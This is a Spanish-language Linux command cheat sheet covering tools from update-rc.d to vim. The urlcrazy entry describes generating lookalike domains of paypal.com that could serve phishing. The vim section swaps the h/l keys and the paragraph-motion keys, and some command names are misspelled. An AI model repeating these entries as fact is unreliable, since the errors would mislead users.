$ update-rc.d script defaults (coloca un script en el arranque)


update-shells
Localiza los shells provistos por los paquetes de /usr/share/debianutils/shells.d y actualiza /etc/shells con shells recién agregados o eliminados. Para realizar un seguimiento de los cambios realizados por el administrador, consulta un archivo de estado en /var/lib/shells.state.
$ update-shell --verbose (mostrar las shells que se van a añadir o quitar)


update-system
Mantener un sistema Debian actualizado pero sin elementos acumulados como las bibliotecas obsoletas y purgar todos los paquetes que no están listados como dependencias de otro paquete.
# update-system


update-usbids
[usbutils]. Si al ejecutar lsusb nos muestra un mensaje "unknown device" es preciso actualizar la lista del archivo /usr/share/misc/usb.ids. Descarga la última versión del archivo del sitio web y la instala. Esta utilidad requiere wget o lynx.
# update-usbids


upower
[acpitool] Ver las propiedades de la bateria. Para ver las baterias disponibles en el sistema:
	$ upower --enumerate
	/org/freedesktop/UPower/devices/line_power_AC
        /org/freedesktop/UPower/devices/battery_BAT0
	/org/freedesktop/UPower/devices/DisplayDevice
Nota.- /org no es un directorio físico, se tiene que llamar desde upower.
$ upower -i /org/freedesktop/UPower/devices/battery_BAT0 (la capacidad)
$ upower -v (Chequeo de la bateria)


uptime
Tiempo transcurrido desde que se arrancó el sistema
$ uptime -s (Muestra dia, hora, minuto y segondo que arranco el sistema)
$ uptime -p (Muestra el tiempo transcurrido desde que arrancó el sistema)


uptimed
Daemon de registro del tiempo de actividad del sistema con especial seguimiento de los tiempos de actividad más altos.
# service uptimed status (ver estado del demonio)
# uprecords (ver la tabla de registros)


urlcrazy
[ruby 1.8)]. http://www.morningstarsecurity.com/research/urlcrazy . Herramienta que genera posibles URLs de un dominio que podrian ser usados para ataques de phising, malversing o fraudes varios.
$ ./urlcrazy (Muestra las opciones)
$ ./urlcrazy -o paypal.txt paypal.com (Redirigiendo el resultado a un archivo)
Otras opciones:
-p (Mostrar URL parecidas más populares según google)
-r (No resolviendo los nombre de dominio)


urlview
Extraer las direcciones URL de archivos de texto.
$ urlview archivo.txt


urlwatch
Comprueba si una página web ha sufrido cambios desde la última vez que se lanzó la aplicación. Configurar las URLs, una por linea en el archivo:
$ mkdir .urlwatch
$ nano .urlwatch/urls.txt
	http://www.tuxapuntes.com
	http://crontux.homelinux.com/wiki
	http://systemadmin.es
$ urlwatch (Lanzar la aplicación)


usb-devices
[usbutils]. Script de shell que puede mostrar detalles de los buses USB en el sistema y los dispositivos conectados a ellos. El script está destinado principalmente para ser utilizado si el archivo /usb/devices no está disponible. A diferencia del archivo usb/devices este script solo muestra las interfaces activas (las marcadas con un "*" en el archivo usb/devices).
$ usb-devices


usbguard
Proteger el sistema contra dispositivos USB no autorizados [BadUSB].
# systemctl status usbguard (controlar el estado del servicio)
# usbguard list-devices (listar dispositivos USB conectados, si estan permitidos, bloqueados o rechazados y ver sus IDs)
# usbguard allow-device <ID_del_dispositivo> (permitir un dispositivo)
# usbguard block-device <ID_del_dispositivo> (bloquear un dispositivo)
# usbguard monitor (monitorizar en tiempo real los eventos de dispositivos USB)
# usbguard generate-policy > /ruta/a/politica.conf (generar archivo de configuración que puede reutilizarse en otros sistema)
Se pueden crear reglas para dispositivos USB en el archivo:
# nano /etc/usbguard/rules.conf
Con la linea:
    allow id 1d6b:0002 (para autorizar)
Y si se quere bloquear todo:
# nano /etc/usbguard/usbguard-daemon.conf
    PresentDevicePolicy=block
Para cambiar cómo se tratan los dispositivos USB ya conectados cuando el servicio USBGuard se inicia:
# nano /etc/usbguard/usbguard-daemon.conf
Y en las opciones en "PresentDevicePolicy":
    apply-policy: aplica las reglas existentes a los dispositivos ya conectados.
    allow: permite todos los dispositivos ya conectados.
    block: bloquea todos los dispositivos ya conectados.


usb_modeswitch
Configuración del modem Huawei. Editar:
# gedit /etc/usb_modeswitch.conf
	EnableLogging=0
Y pegar el siguiente contenido:
	# Huawei E1752
	#
	# Contributor:
	DefaultVendor=0x12d1
	DefaultProduct=0x1446
	TargetVendor=0x12d1
	TargetProduct=0x1417
	MessageEndpoint=0x01
	MessageContent="55534243000000000000000000000011060000000000000000000000000000"
Verificar que el número de TargetProduc coincida con la salida de:
# lsusb
	Bus 006 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
	Bus 005 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
	Bus 004 Device 002: ID 0461:4d03 Primax Electronics, Ltd Kensington Mouse-in-a-box
	Bus 004 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
	Bus 003 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
	Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
	Bus 001 Device 006: ID 12d1:1417 Huawei Technologies Co., Ltd.
	Bus 001 Device 003: ID 0402:5602 ALi Corp. Video Camera Controller
	Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
Arrancarlo con alguno de los siguientes comandos:
# usb_modeswitch -v 12d1 -p 1417 -d 1
# usb_modeswitch -c /etc/usb_modeswitch.conf


usbhid-dump
[usbutils]. Volcar descriptores de informe y flujos de interfaces HID de todos los dispositivos USB conectados.
$ usbhid-dump (básico)
$ usbhid-dump -m 5543:0005 -es (Volcar flujo de informes para un dispositivo con ID de proveedor 0x5543 e ID de producto 0x0005)
$ usbhid-dump -es (Volcar flujos de informes de todas las interfaces HID de todos los dispositivos USB [precaución: perderá el control sobre el terminal si usa un teclado USB])


usbmount
(+ autofs [demonio]). Automontar dispositivos de almacenamiento externo. Editar:
# nano /etc/usbmount/usbmount.conf
Y verificar/modificar según necesidades, las lineas:
MOUNTPOINTS="/media/usb0 /media/usb1 /media/usb2 /media/usb3 /media/usb4 /media/usb5 /media/usb6 /media/usb7"
FILESYSTEMS="vfat ext2 ext3 ext4 hfsplus"
MOUNTOPTIONS="sync,noexec,nodev,noatime,users,umask=000"


usbtop
Muestra un ancho de banda instantáneo estimado en dispositivos y buses USB.
Cargar módulo:
# modprobe usbmon
# usbtop (lanzar la aplicación)


usbutils
Paquete que contiene varias utilidades para inspeccionar los dispositivos conectados al bus USB. Incluye los comandos lsusb [ver], usb-devices [ver], usbhid-dump [ver] y usbreset.
Primero ha de lanzarse:
$ lsusb (para conocer el bus y el device)
  ...
  Bus 001 Device 006: ID 0930:652a Toshiba Corp. TravelDrive
  ...
$ usbreset 001/006 (con los datos anteriores [bbb/ddd], resetear un usb)
$ usbreset 0930:652a (lo mismo pero con los datos ID de la salida lsusb)


uscan
Se ejecuta sin argumentos desde la raíz del árbol de fuentes donde se ve el directorio debian/, o un directorio que contiene varios árboles de fuentes.
$ uscan


user-dirs.dirs
[archivo $HOME/.config/user-dirs.dirs] Archivo donde se especifican los directorios que saldran por defecto en el $HOME:
XDG_DESKTOP_DIR=”$HOME/Escritorio”
XDG_DOWNLOAD_DIR=”$HOME/Descargas”
XDG_TEMPLATES_DIR=”$HOME/Plantillas”
XDG_PUBLICSHARE_DIR=”$HOME/Público”
XDG_DOCUMENTS_DIR=”$HOME/Documentos”
XDG_MUSIC_DIR=”$HOME/Música”
XDG_PICTURES_DIR=”$HOME/Imágenes”
XDG_VIDEOS_DIR=”$HOME/Vídeos”


user-setup
Normalmente cuando se instala una distro, durante la instalación se crea un primer usuario. Si por alguna de las cosas poco probables, no se ha creado, con este paquete puede hacerse.
$ user-setup


useradd
Crear usuarios.
# useradd -d /home/user -m user (Especifica la ruta a su $HOME)
Otras opciones:
-M usuario  (sin directorio $HOME)
-g users user (grupo principal al que pertenece el usuario)
-e 20111231 user (fecha de expiración de un usuario: 2011-12-31)
-G video,audio user (grupos adicionales a los que pertenece)
-s /bin/bash (especifica la shell del usuario)
-s /sbin/nologin (El usuario no podra logearse en el sistema. Ideal para usuarios con acceso a Samba o FTP sin acceso al interprete de comandos)
-u 503 (Identificador que sera asignado al usuario. Por defecto la UID será a partir del numero 500. Si no se especifica, automáticamente se establece el siguiente número disponible a partir del último usuario creado.)
Un ejemplo completo:
# useradd -d /home/paco -g users -s /bin/bash -m paco
1.-
/etc/default/useradd
Archivo donde se definen los valores [shell, directorio del directorio personal, ID del grupo, expiración de la contraseña...] por defecto para la creación de nuevos usuarios [ver useradd y skel]
Algunos parámetros:
	GROUP=100
	HOME=/home
	INACTIVE=-1
	EXPIRE=
	SHELL=/bin/sh
	SKEL=/etc/skel


userdel
Borrar usuarios
# userdel usuario (Elimina al usuario pero no su directorio personal)
# userdel -r usuario (lo borra junto a su directorio $HOME)
# userdel -f usuario (Borra al usuario y su directorio personal incluso aunque esté logeado en el sistema)


usermod
modifica propiedades de los usuarios [directorio base, el shell, grupos a los que pertenece, expiración, bloqueo/desbloqueo de la cuenta]
# usermod -G grupo1,grupo2 usuario (añade usuario a grupos)
# usermod -a -G video usuario  (incluye usuario al grupo video. )
# usermod -e 2009-12-10 user  (la cuenta de user expira el 20-12-09)vsftpd
# usermod -L usuario  (Bloquea a usuario)
# usermod -U usuario  (Desbloquea a usuario)
# usermod -u 999 usuario (baja el ID del usuario, normalmente 1000, para ocultarlo de la pantalla de login [gdm])
# usermod -s /sbin/nologin apache (Otorga al usuario apache una shell que no permite la ejecución de ningún comando)
# usermod -l juan pedro (Cambiar el nombre de usuario “pedro” a “juan”)
# usermod -d /home/nuevo -m usuario (modificar el nombre del directorio  home de un usuario)


userpath
Herramienta para agregar ubicaciones personalizadas a la RUTA del usuario.
# userpath append /var/www/html (se agrega la ubicación especificada a la ruta del usuario)
# userpath verify /var/www/html (comprobar si ha agregado)


users
Quien está conectado al sistema
$ users (ejecución básica)
$ users | xargs -n1 echo | sort | uniq -c  (número de sesiones abierta por los usuarios)


userv
Permite ejecutar comandos o scripts con privilegios de otro usuario. Configurar un archivo de reglas para el usuario al que se va a delegar la ejecución que debe estar ubicado en ~/.userv/ del usuario destino:
# nano /home/targetuser/.userv/reglas
      command: /usr/bin/some-command
      user: alloweduser
      group: allowedgroup
      options: allow_stderr_output
Esto permite que el usuario alloweduser ejecute /usr/bin/some-command en nombre de targetuser.
$ userv targetuser reglas (el usuario en cuyo nombre se ejecutará el comando y la regla definida en ~/.userv/)
$ userv targetuser reglas arg1 arg2 (Si el comando de la regla admite argumentos se pueden pasar directamente)
$ userv --dry-run targetuser reglas (probar la configuración sin ejecutar el comando)


userv-dyndns
Diseñado para gestionar registros DNS de forma segura y controlada por usuarios que no tienen privilegios de administrador. Primero configurar el servicio:
# nano /etc/userv/dyndns.conf
      domain example.com
      ttl 300
      allowed_user alice bob
El archivo define: domain: El dominio para el que se pueden actualizar registros, ttl: Tiempo de vida de los registros DNS y allowed_user: Lista de usuarios permitidos para actualizar registros. Luego definir de reglas para userv:
# nano /etc/userv/userv.dyndns.rules.
        command: /usr/bin/userv
        user: root
Este archivo permite que el comando userv se ejecute con privilegios de root.
$ userv root dyndns --set alice.example.com --ip 203.0.113.42 (actualizar el registro alice.example.com con la dirección IPv4 203.0.113.42)
$ userv root dyndns --delete alice.example.com (elimina el registro asociado con alice.example.com)
$ userv root dyndns --set alice.example.com --ip 203.0.113.42 --ttl 600 (actualiza el registro con un TTL de 600 segundos)
$ userv root dyndns --check-permissions (verificar si se tiene permisos)


util-linux
Paquete estándar distribuido por la Linux Kernel Organization que contiene varias utilidades importantes, la mayoría de las cuales están orientadas al mantenimiento del sistema. Incluye las siguientes aplicaciones: dmesg, findmnt, lsblk, more, mountpoint, su, wdctl, agetty, blkdiscard, blkid, blkzone, blockdev, chcpu, ctrlaltdel, findfs, fsck, fsck.cramfs, fsck.minix, fsfreeze, fstrim, getty, isosize, mkfs, mkfs.bfs, mkfs.cramfs, mkfs.minix, mkswap, pivot_root, runuser, sulogin, swaplabel, switch_root, wipefs, zramctl, addpart, choom, chrt, delpart, fallocate. flock, getopt, hardlink, i386, ionice, ipcmk, ipcrm, ipcs, last, lastb, linux32, linux64, lscpu, lsipc, lslocks, lslogins, lsmem, lsns, mcookie, mesg, namei, nsenter, partx, prlimit, rename.ul, resizepart, rev, setarch, setpriv, setsid, setterm, taskset. uclampset, unshare, utmpdump, whereis y x86_64


util-linux-extras
Herramientas que se encuentran comúnmente en sistemas donde se inicia sesión de forma interactiva o que son necesarias con configuraciones de sistema no estándar. Incluye las siguientes aplicaciones: fincore, lsfd, lsirq y hwclock.


util-linux-locales
Paquete que contiene los archivos de internacionalización para el paquete util-linux. Son necesarios cuando se desea que los programas de util-linux impriman sus mensajes en otros idiomas que no sean inglés.


utorrent
Descarga de torrents. Previamente crear los directorios de descargas:
$ mkdir rtorrent
$ mkdir rtorrent/descargas
$ mkdir rtorrent/sesion vsftpd
$ mkdir rtorrent/torrents
Los torrents se colocan en la carpeta rtorrent/torrents para que al abrir la aplicación los coja directo. Crear un archivo de configuración:
$ touch .rtorrent.rc
Editarlo y pegar las siguientes entradas:
$ nano .rtorrent.rc
# Session directory
session = /home/USER/rtorrent/sesion
directory = /home/USER/rtorrent/descargas
schedule = watch_directory,5,5,load_start=/home/USER/rtorrent/torrents/*.torrent
# Port range to use for listening.
port_range = 55556-55560
# Maximum number of simultanious uploads per torrent.
max_uploads = 5
# Global upload and download rate in KiB. "0" for unlimited.
#download_rate = 0
upload_rate = 50
# Maximum and minimum number of peers to connect to per torrent.
#min_peers = 40
max_peers = 80
# Same as above but for seeding completed torrents (-1 = same as downloading)
min_peers_seed = 10
max_peers_seed = 30
Algunos atajos:
	^ q (cierra la aplicación)
	Flechas arriba y abajo (Selecciona torrents)
	flecha derecha (Muestra información sobre el torrent seleccionado)
	^ s (Inicia la descarga el torrent seleccionado)
	^ d (para la descarga o, si está parada, suprime el torrent)


uuencode
[sharutils]. Algoritmo utilizado para convertir datos binarios de 8 bits a formato de 7 bits. La codificación uuencoding se creó originalmente para enviar archivos binarios mediante el protocolo de correo electrónico uucp. Si no se especifica salida se muestra por pantalla (/dev/stdout)
$ uuencode file1 file2 > file.uue ("file1": nombre del binario a codificar, "file2": Nombre que tendrá el binario una vez descodificado [puede ser el mismo que el binario original] y "file.uue" el nombre que se verá en el directorio.)
$ uudecode file.uue (Descodificar el binario. Se verá con el nombre puesto en "file2")


uuid
Los UUID son números de 128 bits que pretenden tener una alta probabilidad de unicidad en el espacio y el tiempo y son computacionalmente difíciles de adivinar. Son identificadores únicos a nivel mundial que pueden generarse localmente sin contactar a una autoridad de registro global. Los UUID están pensados como identificadores únicos tanto para el etiquetado masivo de objetos con una vida útil extremadamente corta como para la identificación confiable de objetos muy persistentes en una red.
$ uuid -m (Fuerza el uso de una dirección MAC de multidifusión aleatoria)
$ uuid -F STR (representación de cadena ASCII hexadecimal de 36 caracteres de un UUID)
$ uuid -F SIV (representación de un valor entero único de 39 caracteres de longitud máxima de un UUID)
$ uuid -v1 (generar uuid de la versión 1 de uuid)
$ uuid -d 8ce17124-a813-11ee-a715-8fccac721c4c (decodificar un UUID determinado)


uuidcdef
Genera un nuevo identificador uuid. [ver uuidgen]


uuidd
Demonio utilizado por la biblioteca UUID para generar identificadores únicos universales de una manera segura y única garantizada, incluso frente a un gran número de subprocesos que se ejecutan en diferentes CPUs.
$ uuidd -p /tmp/uuidd.pid -s /tmp/uuidd.socket (Especificando ruta donde escribir el archivo pid y no creando un socket, sino esperando que lo proporcione el proceso)
$ uuidd -d -r -n 42 -s /tmp/uuidd.socket (Ejecutar uuidd en modo de depuración, intentando conectarse a un demonio uuidd en ejecución y solicitarle que devuelva un UUID aleatorio, al emitir una solicitud de prueba a un uuidd en ejecución, solicitar una respuesta masiva de UUID numéricos y no creando un socket sino esperando que lo proporcione el proceso)
$ uuidd -d -k -s /tmp/uuidd.socket (modo depuración, eliminar el daemon si se está ejecutando y esperando a que lo proporcione el proceso)


uuidgen
[uuid-runtime]. Crear nuevo valor uuid
$ uuidgen -r (Aleatorio)
$ uuidgen -t (Crea un UUID basado en el reloj del sistema)


uuidparse
Utilidad para analizar identificadores únicos UUID.
$ uuiparse -J UUID (Utilizar el formato de salida JSON)
$ uuiparse -r UUID (Utilizar el formato de salida raw)


uz
extrae un archivo tar comprimido con gzip. No es estrictamente necesario porque el programa tar [ver] proporciona la misma capacidad.
$ uz archivo.tar


uzbl-browser
[uzbl-tabbed)]. Navegador estilo vi. Arrancarlo con uzbl-tabbed para permitir pestañas.
$ nano .config/uzbl/config (archivos de configuración)
Atajos:
	j (descendeer en la página)
	k (subir en la página)
	h (ir a la izquierda de la página)
	l (ir a la derecha de la página)
	<< (ir al final de la página)
	>> (ir al principio de la página)
	o (abrir guión para entrar una url)
	gg (abrir guión para entrar una busqueda en google)
	gh (página de inicio)
	gn (abrir nueva pestaña en blanco)
	go (abrir dirección en una nueva pestaña)
	gt (ir a la siguiente pestaña)
	gT (ir a la pestaña anterior)
	gi+2 (ir a la pestaña 2)
	w (abrir nueva ventana)
	b (volver a la página anterior)
	u (favoritos)
	U (historial)
	Esc (anular)
	S (stop)
	ZZ (Cerrar pestaña /cerrar ventaña / salir de uzbl)
	r (actualizar página)
	R (actualizar página desde la caché)
	/ (Guión para entrar una busqueda en la página)
	n (ir a la busqueda siguiente)
	N (ir a la busqueda anterior)


validlocale
Comprobar si una configuración regional determinada está disponible.
          $ validlocale ca_ES.UTF-8
          locale 'ca_ES.UTF-8' valid and available


variables
Existen dos tipos de variables:
Variables locales (tiene valor únicamente dentro de nuestra shell)
Variables globales (disponibles para todos los procesos invocados por la shell)
Al ejecutar un script la línea de comandos introducida se guarda en unas variables especiales que podemos referenciar:
$0 (Nombre del comando)
$1 (Primer argumento)
$2 (Segundo...)
$@ (Todos los argumentos introducidos, separados por espacios)
$# (Número de argumentos)
$$ (identificador del proceso)
$? (Cuando finaliza la ejecución de un proceso, $? será cero (0) si se ejecuta correctamente y distinto de cero si se ha producido algún error. Es muy usual guardar su valor en una variable (VAR=$?) para su posterior uso.)
Para declarar una variable sólo se precisa asignarle un valor. Nunca el valor puede preceder a la variable. No se ponen espacios ni antes ni después del signo igual. El nombre puede contener caracteres alfabéticos (A-Z, a-z), numéricos (0-9) o el guión bajo ‘_’. El primer carácter no puede ser un número o contener otros signos (2DIR, .DIR, -VAR...)
	DIR="/var/www"
También puede asignarse a partir del contenido de un fichero:
	$ firma=$(<firma.txt)
Puede asignarse a la salida de un comando encerrado entrecomillas graves:
	WHO=`who | awk '{print$2}'`
O entra parentesis antecedido por el signo dolars ($):
	WHO=$(who | awk '{print$2}')
Variables introducidas por el teclado:
	echo "Como te llamas"
	read NOMBRE
Puede especificarse un tiempo (en segundos) de espera para entrar lo solicitado (-t):
	read -t 10 -p "¿Nombre y apellido? " NOMBRE APELLIDO
Para definir variables numéricas se utiliza el comando let:
	let A=100
	let B=200
	let C=$A+$B
Si al llamar a una variable, esta va seguida de un carácter que sea otra letra, numero o el guión normal o bajo, La encerraremos entre llaves '{}':
	ARCHIVO="registro"
	echo "${ARCHIVO}_2011.txt"
	registro_2011.txt
Cuando bash encuentra en una palabra el signo "$" todo lo que va a continuación se considera el nombre de una variable y todos los caracteres desde el "$" hasta el final de la palabra son sustituidos por dicha variable:
	COSA="camastro"
	echo "ca$COSA"
	camastro
Otra forma de entrar variables es mostrando un promt:
	$ read -p "palabra> " PALABRA
Si no indicamos nombre de variable, lo ingresado se guarda en la variable REPLY:
	read
	juan jose pedro
	$ echo $REPLY
	juan jose pedro
Modificar parte de una variable:
	a="Linux es un sistema genial"
	echo ${a/geni/brut}
	Linux es un sistema brutal
Algunas de la variables globales:
	$HOME  (ruta del directorio home del usuario)
	$PATH    (directorios donde se encuentran los ejecutables)
	$TERM    (tipo de la terminal)
	$BASH    (ruta del interprete bash )
	$PWD      (directorio actual)
	$USER     (Usuario)
	$HOSTNAME  (Nombre del equipo)
	$HISTFILE (ruta para el histórico de comandos ejecutados)
	$UID     (Número de usuario para el sistema)
	$RANDOM (números aleatorios entre 0 y 32767)


vbetool
Herramienta para apagar y encender la pantalla de un portatil (backlight)
# vbetool dpms off (Apaga la pantalla)
# vbetool dpms on (Enciende la pantalla)


vdir
Equivalente a ls -l.


vdirsyncer
cliente de CalDAV y CardDAV que permite sincronizar eventos del calendario y contactos entre un servidor remoto, como Google Calendar o OwnCloud, con una carpeta local del sistema. Esto significa que puede tener acceso a los calendarios y direcciones desde diferentes dispositivos sin depender de la conexión a internet para verlos.
$ vdirsyncer --caldav https://example.com/calendars/USER --carddav https://example.com/addressbooks/USER --local-folder /path/to/local/folder (sincroniza el calendario y la libreta de direcciones del usuario USER del servidor con una carpeta local)
$ vdirsyncer --caldav https://example.com/calendars/user --carddav https://example.com/addressbooks/user --local-folder /path/to/local/folder --log-level DEBUG --sync-interval 3600 --max-sync-threads 4 (incluye opciones adicionales como el nivel de log, intervalo de sincronización y número máximo de hilos para la sincronización)
$ vdirsyncer --caldav https://example.com/calendars/user --local-folder /path/to/local/folder --sync-type iCal (sincroniza solo el calendario sin incluir la libreta de direcciones)
$ vdirsyncer --carddav https://example.com/addressbooks/user --local-folder /path/to/local/folder --sync-type vCard (sincronización de solo libreta de direcciones)


verse
Muestra un verso de la Biblia en cada inicio de sesión. Cada día se asigna un versículo de la versión King James de la Biblia [en inglés].


vfu
Gestor de archivos. Configuración en /home/USUARIO/.vfu/vfu.conf
$ vfu -d /usr/local -i (Especificando directorio y de forma interactiva)
$ vfu (Abre el presente directorio)
Algunos atajos:
	c (Copiar)
	Enter (entrar en un directorio o abrir documento)
	e (Eliminar)
	g (Seleccionar/deseleccionar todo)
	i (Editar archivo. Por defecto usa joe. Modificar en el archivo de configuración)
	h (Muestra las teclas de ayuda)
	n (Buscar)
	Flecha derecha (Renombrar)
	q (Salir)


vglconnect
Crear conexión para el uso de VirtualGL entre la maquina cliente y la remota (la que ejecutará las aplicaciones OpenGL). Funciona como una conexión SSH pero con la redirección de aplicaciones gráficas activada.
$ vglconnect usuaro@1.2.3.4


vglrun
Ejecuta aplicaciones utilizando las librerias de VirtualGL
$ vglrun programa
$ vglrun -q 70 programa (Baja la calidad de los JPG enviados entre la máquina remota y la local)


video
1.- Descargar video flash:
Iniciar la reproducción del vídeo.
$ lsof |grep Flash
chromium- 15931 lb 25u REG 8,2 2422656 656146 /tmp/FlashXXYX9waY (deleted)
Los datos que interesan son: 15931 y 25. Sin cerrar la página del vídeo y una vez finalizada su carga copiarlo:
$ cp /proc/15931/fd/25 video.flv


videoob
[webood (ver)]. Visualización y descarga de videos. Para activar nuevos módulos (youtube, vimeo...) ver weboob.
$ videoob (Entrar en el prompt)
videoob> search porn (Buscar videos ralacionados con "porn")
videoob> info 3 (Información sobre el marcado con el número 3 en el listado anterior)
videoob> play 3 (Reproduce el número 3)
videoob> download 3 (Descarga el número 3 en el directorio actual)
videoob> quit (Salir del prompt)
videoob> download 3 video.mp4 (Descarga el número 3 en el directorio actual renombrandolo video.mp4)


videotop
[videotop-git, urwid, youtube-dl]. Descarga de videos de youtube.
$ videotop  (Para entrar en el prompt)
Teclear:
	:s queen (se mostrarán los videos en los que aparezca queen. Se selecciona con la flechas el que se quiera descargar y se pulsa intro. El video se encontrará en $HOME/.videotop/videos/)
	:5 (Descargar el video 5)
	:v (Muestra los videos descargados [ls $HOME/.videotop/videos])
	:q (salir)
	:delete (borrar video seleccionado)
	:clear (limpia la busqueda y se entra en modo buscador.)
		^r (limpia el listado)
		^n (continuación de la misma busqueda)


videotrans
Colección de utilidades diseñadas para ayudar en la creación de DVDs. Los programas que integran la herramienta son: movie-compare-dvd, movie-fakewavspeed, movie-make-title, movie-make-title-simple, movie-progress, movie-rip-epg.data, movie-title, movie-to-dvd y movie-zoomcalc.


vidir
[moreutils]
Edita como un archivo de texto directorios o archivos.
$ vidir /home/usuario
$ vidir *.png


view
Ver en pantalla el contenido de un archivo.
$ view fichero.txt


viewres
Muestra el árbol con la jerarquía de clases de widgets de Athena Widget Set.
$ viewres -name shell
$ viewres -variable
$ viewres -vertical


vifm
Plugin de Vim que permite el uso de un selector de archivos en el propio Vim. Descarga: https://github.com/vifm


vigpg
Programa que envuelve al editor cuando se editan archivos encriptados como puede ser el archivo de contraseñas .gpg.
3 vigpg archivo.txt.gpg


vigr
Editor que permite modificar el fichero /etc/group en modo seguro. La diferencia de editarlo con vigr o hacerlo con cualquier otro editor (gedit, nano...) es que vigr bloquea el fichero para evitar ediciones simultaneas y en el momento de guardar los cambios realiza un chequeo del fichero en busca de fallos de sintaxis.
# vigr (Editar el fichero /etc/group)
# vigr -s (Editar el fichero /etc/gshadow)


vilistextum
Convertir textos html a ascii
$ vilistextum -m -n archivo.html archivo.txt (sin mostrar caracteres estraños ni imagenes)


vim
Editor
$ vim fichero (Abrir un fichero)
$ vim -x fichero (Poner contraseña a un fichero)
$ vimtutor (Lanzar un tutorial elemental de vim)
Algunas teclas para no morir en el intento:
modo:
	i (Entrar en modo edición)
	esc (Salir modo edición y entrar en modo comando)
Salvavidas
	u (Cada pulsación deshace el siguiente cambio del historial)
Movimientos del cursor:
	k (Arriba)
	j (Abajo)
	h (Derecha)
	l (Izquierda)
	w (Ir al principio de la palabra posterior)
	b (Ir al principio de la palabra anterior)
	$ (Ir al final de la linea)
	0 (Ir al principio de la linea)
	) (Ir a la frase siguiente)
	( (Ir a la frase anterior)
	{ (Pasar al siguiente párrafo)
	} (Pasar al anterior párrafo)
	H (Ir a la parte superior de la pantalla)
	M (Ir a la parte media de la pantalla)
	L (Ir a la parte inferior de la pantalla)
	Crtl + d (Avanzar media pantalla)
	Crtl + u (Retroceder media pantalla)
	gg (Ir al principio del ficherol)
	G (Ir al final del fichero)
	:20 (Ir a la linea 20)
Borrar:
	daw (palabra)
	d3aw (3 palabras)
	dd (Linea)
	3dd (3 lineas)
	d$ (Del cursor al final de la linea)
	d0 (Del cursor al principio de la linea)
Copiar, pegar e insertar:
	yy (copiar línea)
	p (pegar debajo del cursor)
	yaw (copiar toda la palabra)
	yap (Cortar todo  el párrafo)
	:r archivo (insertar "archivo")
	:r! comando (insertar salida de comando)
	o (Insertar linea en blanco y entrar en edición)
Búsqueda:
	/palabra (buscar hacia adelante "palabra")
	/palabra\c (buscar "palabra" sin importar mayúsculas o minúsculas)
	n (Siguiente coincidencia hacia delante)
	N (Siguiente coincidencia hacia atras
	:%s/texto1/texto2/g (Substituir "texto1" por "texto2" en todo el archivo)
Abrir, guardar y salir
	:q! (Salir sin guardar)
	:w (Guardar cambios sin salir)
	:x (Guardar cambios y salir)
	:w fichero (Guardar en un fichero distinto y seguir)
	:e fichero2 (Cierra el fichero actual y abre fichero2)
	:e . (Abre un navegador de ficheros del directorio actual)
	:e (Recarga el fichero)
	ZZ (Guardar y salir)
	:w !sudo tee % (Guardar un archivo tras haberlo abierto sin “sudo”)
Modo visual:
	v (Entra en modo visual para seleccionar texto)
	c (Cortar)
	y (Copiar)
	p (Pegar)
	"add (Cortar linea y guardarla con el nombre "a")
	"ap (Pegar la linea guardada como "a")
	"+3dd (Cortar 3 lineas y guardarlas en el portapapeles)
	"+p (Pegar las lineas guardadas en el portapapeles)
Dejar marcas en un texto:)
	ma (Marca una linea con la "a". las siguientes: mb, mc, md..)
	'a (Ir a la linea marcada con la "a")
	'. (Ir a la última linea modificada)
Ejecución de comandos durante la edición:
	:!ls (Muestra listado del directorio y con intro regresa al editor)
	:shell (Pausa la edición y entra en modo shell. Con "exit" vuelve a vim)
	Ctrl z (Suspende vim y entra en la shell. Con "fg" vuelve a vim)
Crear pestañas:
	:tabnew fichero (Abrir un archivo en una nueva pestaña)
	gt (Moverse entre pestañas)
	:close (Cierra la ventana o la subdivision de la ventana)
	:only (Cierra todas las ventanas menos la actual)
Dividir la pantalla en distintos paneles:
	:split fichero (Abrir un archivo en una division horizontal de la ventana)
	:vsplit fichero (Abrir un archivo en una division vertical de la ventana)
	:new (Abre un nuevo panel vacio)
	:close (Cerrar panel o ventana)
	Ctrl + w flecha (Moverse entre los distintos paneles de una ventana)
	Ctrl + w n (crear nueva ventana)
	Ctrl + w h (ir a la ventana de la izquierda)
	Ctrl + w j (ir a la ventana de abajo)
	Ctrl + w k (ir a la ventana de arriba)
	Ctrl + w l (ir a la ventana de la derecha)
	Ctrl + w t (ir a la ventana de más arriba)
	Ctrl + w b (ir a la ventana de más abajo)
	Ctrl + w w (pasar a la siguiente ventana)
	Ctrl + w + (aumentar el tamaño de la ventana en 1 linea)
	Ctrl + w - (disminuir el tamaño de la ventana en 1 linea)
Imprimir:
	:ha (Imprimir todo el documento)
	:ha > archivo.pdf (Imprimir a pdf)
Guardar sesiones:
	:mksession! archivo (Guarda la sesión actual en "archivo")
	:source archivo (Una vez abierto el archivo, carga la sesión guardada)
Corrector ortográfico:
	:set spell spelllang=es (Activar diccionario. spelllang=ca para catalan)
	z= (Con el cursor en el error, muestra las sugerencias)
	Ctrl + x s (Abre el menú de sugerencias sin salir del modo insertar)
	:spellrepall (Corrige en todo el texto la que acabamos de corregir
	zg (Añadir al corrector la palabra del cursor)
	zw (Surpimir del corrector la palabra del cursor)
Buffers:
	:buffers (Muestra buffers abiertos (actual [%], cerrado [#], activo [a], oculto [h])
	:buffer 2 (salta al buffer 2)
	:bn (Ir al siguiente buffer)
	:bp (Ir al anterior)
	:bd (suprimir buffer [Cerrar archivo])
	:ls (Lista los buffers)
Varios:
	:e /home/usuario (Abre vim en modo navegador de archivos con el directorio mencionado)
	:Ex (Abre el navegador de archivos en un nuevo panel de la ventana activa)
algunos ajustes que pueden implementarse, bien durante la edición [en modo normal] o
permanentemente en ~/.vimrc [en este caso quitar los dos puntos iniciales]:
	:set showmode/noshowmode (mostrar/no mostrar modo actual de vi)
	:set ts=4 (Fija los tabulados a 4 espacios)
	:set sw=4 (Fija los indentados a 4 espacios)
	:set number/nonumber (Activa/desactiva el numerado de lineas)
	:set backup/nobackup (Activa/desactiva la copia de seguridad automática)
	:set directory=dir (fija la carpeta donde se harán las copias)
	:syntax on/off (Activa/desactiva el resaltado de sintaxis)
